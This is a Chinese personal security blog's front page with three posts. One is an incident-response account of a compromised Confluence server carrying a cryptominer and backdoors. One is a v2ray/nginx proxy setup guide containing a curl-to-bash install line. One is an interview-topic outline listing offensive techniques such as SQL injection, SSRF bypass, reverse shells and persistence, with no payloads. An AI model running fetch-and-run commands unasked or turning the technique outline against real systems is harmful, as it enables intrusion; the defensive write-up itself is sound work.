<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">
<meta name="google-site-verification" content="9Uqdk6WBttaW2iVEZWNVyCsRscTnIN0PddwPIO3LnJ0" />
<meta name="baidu-site-verification" content="code-oUsBMQlUt5" />









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="true" />








  <meta name="baidu-site-verification" content="true" />







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="欣海余诚&#39;s blog">
<meta property="og:url" content="https://xhycccc.github.io/index.html">
<meta property="og:site_name" content="欣海余诚&#39;s blog">
<meta property="og:locale">
<meta property="article:author" content="欣海余诚">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://xhycccc.github.io/"/>





  <title>欣海余诚's blog</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband">
<a target="_blank" rel="noopener" href="https://github.com/xhycccc" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
    </div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">欣海余诚's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">习惯成自然</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-guestbook">
          <a href="/guestbook/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-comment"></i> <br />
            
            留言
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2021/09/07/A-Security-Response/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/07/A-Security-Response/" itemprop="url">一次安全事件应急响应</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-07T14:13:15+08:00">
                2021-09-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index">
                    <span itemprop="name">应急响应</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>9月3号下午，运维同事说有个合作厂商的云服务器端口被封禁了，让帮忙排查原因。服务器是在AWS上的，并且没有购买任何安全服务。</p>
<p><img src="1.png" alt="image"></p>
<h2 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h2><p>看截图应该是说出流量过大导致的端口被封，怀疑是被当成肉鸡DDoS别人。</p>
<p>所以先看下这台主机的出流量情况（当时没有截图，大概是下图这样- -。）</p>
<p><img src="2.png" alt="image"></p>
<p>在前几天每天的固定时间段，出流量都达到了5G以上，这个比较可疑。跟第三方厂商确认了下他们这台主机部署的只是一个内部wiki系统，用不了这么多流量。</p>
<p>联想到最近爆出漏洞的Confluence也是常用于搭建wiki，很可能跟此次事件有关。</p>
<p><img src="3.png" alt="image"></p>
<p>我9月2号得知这个漏洞，正好公司有用Confluence，于是第一时间帮公（自）司（己）检（娱）测（乐）一下，没想到直接秒杀！</p>
<p><img src="4.png" alt="image"></p>
<p>足以见此漏洞的严重性！好在只是对内网开放，我也是第一时间通知了IT同事修复。</p>
<h2 id="事件调查"><a href="#事件调查" class="headerlink" title="事件调查"></a>事件调查</h2><p>登录主机，首先查看运行进程以及网络连接，发现confluence相关进程和端口。</p>
<p><img src="5.png" alt="image"><br><img src="6.png" alt="image"></p>
<p>access日志也的确存在漏洞利用行为，时间是9月2日07:27。</p>
<p><img src="6.png" alt="image"></p>
<p>但是由于攻击是post请求，日志中不会记录数据包，所以无法知道攻击者执行的命令。那就手工一项项排查吧- -。</p>
<p>先根据漏洞利用时间，定位最近两天新增的文件（后来才知道当时命令敲错了，怪不得没有发现异常……）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -ctime 0 –o –ctime 1</span><br></pre></td></tr></table></figure>

<p>直觉查看/tmp目录，一般这个目录权限无限制，黑客也常常使用：</p>
<p><img src="7.png" alt="image"></p>
<p>看到xmrig我直呼好家伙，这台机器还被用来挖矿了？看了机器的CPU还真是，从9月2日起就飙升了。看来不止有一伙儿人进来过。</p>
<p>其它的几个可执行文件看起来也不是好东西，上传至微步检测一下：</p>
<p><img src="8.png" alt="image"><br><img src="9.png" alt="image"></p>
<p>Syn这个木马还会在开机启动项中创建一个后门DbSecuritySpt，这个名字伪装的还挺像样。</p>
<p><img src="10.png" alt="image"></p>
<p>听运维同事说服务器SSH设置了白名单。这块重点查一下有无端口转发和反向连接，发现一个伪装成sshd服务的后门：</p>
<p><img src="11.png" alt="image"></p>
<p>经微步确认是和前面的syn木马是同一个。</p>
<p>看到这么多后门木马感觉手工有可能排查不全，还是建议他们开通一个HIDS服务查杀一遍。过程中没有发现跟DDoS相关的木马，先将排查过程中发现恶意文件和进程汇总起来，发给运维同事操作，并持续关注CPU和网络的使用情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/DbSecuritySpt</span><br><span class="line">/tmp/syn</span><br><span class="line">/tmp/syn.1</span><br><span class="line">/tmp/syn.2</span><br><span class="line">/tmp/xmrig</span><br><span class="line">/tmp/xxxx.txt</span><br><span class="line">/tmp/config.json</span><br><span class="line">/tmp/log.txt</span><br><span class="line">/usr/bin/.sshd</span><br><span class="line">/tmp/moni.lod</span><br></pre></td></tr></table></figure>

<p>最后顺手给了第三方厂商一个临时缓解Confluence漏洞的方法：<a target="_blank" rel="noopener" href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>企业应该尽量将自己的Wiki知识库搭建在内网，或限制白名单IP访问。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2021/07/30/v2ray-tutorials/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/07/30/v2ray-tutorials/" itemprop="url">centos+v2ray+nginx科学上网教程</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-07-30T17:58:38+08:00">
                2021-07-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%99%E7%A8%8B/" itemprop="url" rel="index">
                    <span itemprop="name">教程</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum install -y lrzsz vim git make tar gcc openssl-devel pcre-devel zlib-devel </span><br><span class="line">wget http://nginx.org/download/nginx-1.19.1.tar.gz</span><br><span class="line">tar zvxf nginx-1.19.1.tar.gz</span><br><span class="line">cd nginx-1.19.1</span><br><span class="line">./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module --with-stream</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx</span><br></pre></td></tr></table></figure>

<h2 id="安装v2ray"><a href="#安装v2ray" class="headerlink" title="安装v2ray"></a>安装v2ray</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)</span><br></pre></td></tr></table></figure>
<p>编辑/usr/local/etc/v2ray/config.json.</p>
<p>其中id参数可由客户端生成，也可用网上其他方式生成，只要服务端和客户端保持一致即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;log&quot; : &#123;</span><br><span class="line">    &quot;access&quot;: &quot;/var/log/v2ray/access.log&quot;,</span><br><span class="line">    &quot;error&quot;: &quot;/var/log/v2ray/error.log&quot;,</span><br><span class="line">    &quot;loglevel&quot;: &quot;warning&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;inbound&quot;: &#123;</span><br><span class="line">    &quot;port&quot;: 39127, </span><br><span class="line">    &quot;listen&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">      &quot;clients&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;id&quot;: &quot;x-x-x-x-x&quot;, </span><br><span class="line">          &quot;level&quot;: 1,</span><br><span class="line">          &quot;alterId&quot;: 64 </span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">   &quot;streamSettings&quot;:&#123;</span><br><span class="line">      &quot;network&quot;: &quot;ws&quot;,</span><br><span class="line">      &quot;wsSettings&quot;: &#123;</span><br><span class="line">           &quot;path&quot;: &quot;/abc&quot; </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;outbound&quot;: &#123;</span><br><span class="line">    &quot;protocol&quot;: &quot;freedom&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;outboundDetour&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;protocol&quot;: &quot;blackhole&quot;,</span><br><span class="line">      &quot;settings&quot;: &#123;&#125;,</span><br><span class="line">      &quot;tag&quot;: &quot;blocked&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写nginx配置文件/usr/local/nginx/conf/v2ray.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">                listen  80;</span><br><span class="line">                root            /var/www/html/;</span><br><span class="line">                index           index.html index.htm;</span><br><span class="line">                server_name     www.xxx.com;  </span><br><span class="line">                rewrite ^(.*)$  https://$host$1 permanent;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">                listen  443 ssl;</span><br><span class="line">                root            /var/www/html/;</span><br><span class="line">                index           index.html index.htm;</span><br><span class="line">                server_name     www.xxx.com;</span><br><span class="line">                ssl_certificate /etc/letsencrypt/live/www.xxx.com/fullchain.pem;  </span><br><span class="line">                ssl_certificate_key  /etc/letsencrypt/live/www.xxx.com/privkey.pem; </span><br><span class="line">                ssl_protocols TLSv1.2;</span><br><span class="line">                ssl_ciphers   ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4:!DH:!DHE;</span><br><span class="line">                location /PLMOKN &#123;       </span><br><span class="line">                        proxy_redirect off;</span><br><span class="line">                        proxy_pass http://127.0.0.1:39127;  </span><br><span class="line">                        proxy_http_version 1.1;</span><br><span class="line">                        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">                        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">                        proxy_set_header Host $http_host;</span><br><span class="line">                        access_log off;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在/usr/local/nginx/conf/nginx.conf中include进来v2ray.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    include       v2ray.conf;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h2 id="安装ssl证书"><a href="#安装ssl证书" class="headerlink" title="安装ssl证书"></a>安装ssl证书</h2><p>安装之前确认nginx服务是关闭的，并且防火墙开放80/443:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@racknerd-82d3de certauto]# systemctl status firewalld.service</span><br><span class="line">[root@racknerd-82d3de certauto]# firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">success</span><br><span class="line">[root@racknerd-82d3de certauto]# firewall-cmd --zone=public --add-port=443/tcp --permanent  </span><br><span class="line">success</span><br><span class="line">[root@racknerd-82d3de certauto]# firewall-cmd --reload</span><br><span class="line">success</span><br></pre></td></tr></table></figure>

<h3 id="安装Certbot"><a href="#安装Certbot" class="headerlink" title="安装Certbot"></a>安装Certbot</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line">yum install snapd</span><br><span class="line">systemctl enable --now snapd.socket</span><br><span class="line">ln -s /var/lib/snapd/snap /snap</span><br><span class="line">snap install --classic certbot</span><br><span class="line">ln -s /snap/bin/certbot /usr/bin/certbot</span><br></pre></td></tr></table></figure>

<h3 id="执行certbot安装证书命令"><a href="#执行certbot安装证书命令" class="headerlink" title="执行certbot安装证书命令"></a>执行certbot安装证书命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/nginx/conf/* /etc/nginx/ （采取手动编译安装nginx的需要这一步，因为certbot默认校验/etc/nginx下的配置文件）</span><br><span class="line">certbot certonly --email xxx@xxx.com -d www.xxx.com 邮箱和域名填写自己的</span><br><span class="line"></span><br><span class="line">2 Spin 启动临时服务器</span><br><span class="line">Y (Y)es/(N)o</span><br><span class="line">Y (Y)es/(N)o</span><br></pre></td></tr></table></figure>
<p>安装成功后显示证书文件地址，确保与v2ray.conf中的一致。</p>
<h2 id="启动nginx和v2ray"><a href="#启动nginx和v2ray" class="headerlink" title="启动nginx和v2ray"></a>启动nginx和v2ray</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br><span class="line">systemctl enable v2ray</span><br><span class="line">systemctl start v2ray</span><br></pre></td></tr></table></figure>

<h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><p>客户端下载：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/2dust/v2rayN/releases">https://github.com/2dust/v2rayN/releases</a></p>
<p>客户端配置：</p>
<p>选择，服务器-&gt;添加VMess服务器。地址填写域名、用户id可以自动生成，并将id填写到<code>/usr/local/etc/v2ray/config.json</code>文件id参数处、额外id填64、传输协议选ws、路径填/abc，与v2ray.conf文件中location处参数一致即可、其他的可照图片配置。点确定后即可自动启动。如果配置都没问题即可在信息处看到访问记录信息。</p>
<p><img src="https://0xcrane.github.io/images/1%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/9.png" alt="image"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://0xcrane.github.io/">v2ray+nginx科学上网教程-ubuntu</a></li>
<li><a target="_blank" rel="noopener" href="https://lhalcyon.com/certbot-nomore-support/">CertBot不再支持所有的操作系统</a> </li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2021/07/06/Summary_of_interview_knowledge/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/07/06/Summary_of_interview_knowledge/" itemprop="url">安全运营工程师面试知识点汇总</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-07-06T18:00:20+08:00">
                2021-07-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%A2%E7%BB%8F/" itemprop="url" rel="index">
                    <span itemprop="name">面经</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ul>
<li>SQL注入<ul>
<li>分类</li>
<li>手写mysql手注payload（union、报错、延时）</li>
<li>如何区分后端数据库</li>
<li>oracle/sqlserver注入</li>
<li>不同注入场景下注入<ul>
<li>宽字节注入</li>
<li>二次注入</li>
<li>order by注入</li>
<li>limit 注入</li>
<li>table 名注入</li>
<li>update/insert 注入</li>
</ul>
</li>
<li>绕过方式</li>
<li>getshell<ul>
<li>general_log</li>
<li>select into dump_file 有什么条件</li>
<li>站库分离怎么办</li>
</ul>
</li>
<li>提权<ul>
<li>UDF提权</li>
</ul>
</li>
<li>防御方式<ul>
<li>使用预编译是否可以防止所有sql注入？</li>
</ul>
</li>
</ul>
</li>
<li>XSS<ul>
<li>分类（反射、DOM、存储）<ul>
<li>DOM 一定不经过服务器吗？</li>
</ul>
</li>
<li>防御方式（转义、CSP）</li>
<li>相关概念（同源策略、Jsonp、CORS）</li>
<li>利用方式（除盗cookie外）</li>
</ul>
</li>
<li>CSRF<ul>
<li>防御方式<ul>
<li>使用Referer防御是否一定可靠？</li>
</ul>
</li>
</ul>
</li>
<li>SSRF<ul>
<li>绕过<ul>
<li>host 绕过</li>
<li>ip进制绕过</li>
<li>控制域名解析</li>
<li>302跳转</li>
<li>dns rebinding (ttl)</li>
</ul>
</li>
<li>有回显利用<ul>
<li>端口扫描</li>
<li>攻击redis</li>
</ul>
</li>
<li>无回显利用<ul>
<li>dnslog</li>
</ul>
</li>
<li>防御</li>
</ul>
</li>
<li>文件上传<ul>
<li>绕过方式</li>
<li>防御方式</li>
</ul>
</li>
<li>命令执行<ul>
<li>php<ul>
<li>绕过姿势</li>
<li>shell_exec和exec的区别</li>
</ul>
</li>
<li>Java反序列化<ul>
<li>Shiro<ul>
<li>550</li>
<li>721</li>
<li>权限绕过</li>
</ul>
</li>
<li>Fastjson<ul>
<li>漏洞原理</li>
<li>黑名单检查函数</li>
<li>利用链</li>
</ul>
</li>
<li>Weblogic<ul>
<li>漏洞类型、原理</li>
<li>漏洞函数</li>
</ul>
</li>
<li>ysoserial<ul>
<li>原理</li>
<li>链</li>
</ul>
</li>
<li>SpEL/OGNL 表达式注入</li>
</ul>
</li>
</ul>
</li>
<li>其它<ul>
<li>XXE</li>
<li>https握手流程</li>
<li>中间人攻击原理</li>
</ul>
</li>
</ul>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><ul>
<li>反弹shell<ul>
<li>类型</li>
<li>检测原理</li>
</ul>
</li>
<li>正向shell<ul>
<li>reg</li>
<li>?</li>
</ul>
</li>
<li>webshell<ul>
<li>disable_functions绕过</li>
<li>内存马</li>
</ul>
</li>
<li>权限维持<ul>
<li>系统后门</li>
<li>无文件攻击</li>
<li>dll劫持，dll注入</li>
</ul>
</li>
<li>痕迹清理<ul>
<li>C2隐藏 </li>
</ul>
</li>
<li>钓鱼<ul>
<li>姿势</li>
</ul>
</li>
</ul>
<h2 id="名词概念"><a href="#名词概念" class="headerlink" title="名词概念"></a>名词概念</h2><ul>
<li>ATT&amp;CK</li>
<li>SPF</li>
<li>DMARC</li>
</ul>
<h2 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h2><ul>
<li>病毒排查及溯源</li>
<li>Webshell排查及溯源</li>
</ul>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><ul>
<li>linux/Windows提权</li>
